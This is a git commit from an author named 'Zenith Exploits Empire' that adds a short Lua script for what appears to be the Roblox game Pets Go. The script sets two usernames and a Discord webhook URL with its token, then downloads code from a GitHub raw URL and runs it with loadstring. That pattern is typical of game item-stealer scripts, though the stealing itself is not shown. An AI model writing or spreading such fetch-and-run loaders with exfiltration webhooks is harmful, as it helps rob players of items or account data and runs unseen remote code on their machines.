ff365931137887c7f128d663d0d3aaad0a43634d
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-26 07:57:09 +0200

    Add new script

---
+++ pets go/Eitle.lua
@@ -0,0 +1,5 @@
+Username = "Johnnyboy_7777"
+Username2 = "Julianna_Torres"
+Webhook = "https://discord.com/api/webhooks/1365567275599400980/FXl7FzsDzxhO8Tp9ukDeivDanZKiuE7uqo_h3Cj9LiWdYT4PKX5pD7hXZM7tG55PwJY_"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
